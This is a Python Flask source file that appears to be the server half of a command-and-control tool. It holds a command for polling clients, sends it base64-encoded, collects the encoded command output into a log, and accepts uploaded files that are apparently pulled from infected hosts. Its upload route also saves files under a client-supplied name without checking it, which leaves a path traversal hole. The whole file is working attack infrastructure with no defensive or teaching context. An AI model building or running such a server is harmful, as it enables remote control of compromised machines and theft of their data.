from flask import Flask, request, jsonify
from datetime import datetime
import base64

app = Flask(__name__)

current_command  = ""
output_log_file  = "../logs/command_output.log"


def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def b64_encode(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode("utf-8")


def b64_decode(text: str) -> str:
    return base64.b64decode(text.encode("utf-8")).decode("utf-8", errors="ignore")


@app.route('/command', methods=['GET'])
def get_command():
    """Restituisce il comando corrente codificato in base64."""
    global current_command
    if not current_command:
        return ""
    return b64_encode(current_command)


@app.route('/result', methods=['POST'])
def post_result():
    """Riceve l'output del comando codificato in base64."""
    global current_command
    raw = request.form.get("output", "").strip()
    if not raw:
        current_command = ""
        return "OK"

    try:
        output = b64_decode(raw)
    except Exception:
        output = raw  # fallback: testo in chiaro

    if output.strip():
        log_entry = f"[{timestamp()}] {output}"
        print(f"COMMAND OUTPUT:\n{log_entry}")
        with open(output_log_file, "a") as log_file:
            log_file.write(f"{log_entry}\n{'-' * 50}\n")

    current_command = ""
    return "OK"


@app.route('/set_command', methods=['POST'])
def set_command():
    """Imposta un nuovo comando (ricevuto in chiaro dalla CLI)."""
    global current_command
    command = request.form.get("command", "")
    if command:
        current_command = command
        print(f"[{timestamp()}] New command: {command}")
        return "", 200
    return "Error!\n", 400


@app.route('/upload_file', methods=['POST'])
def upload_file():
    """Riceve un file."""
    if 'file' not in request.files:
        return jsonify({"error": "No file part in the request"}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400

    file_path = f"./uploaded_files/{file.filename}"
    try:
        file.save(file_path)
        print(f"[{timestamp()}] File saved to {file_path}")
        return jsonify({"message": "File uploaded successfully", "file_path": file_path}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    print(f"[{timestamp()}] Server started on port 80...")
    app.run(host="0.0.0.0", port=80)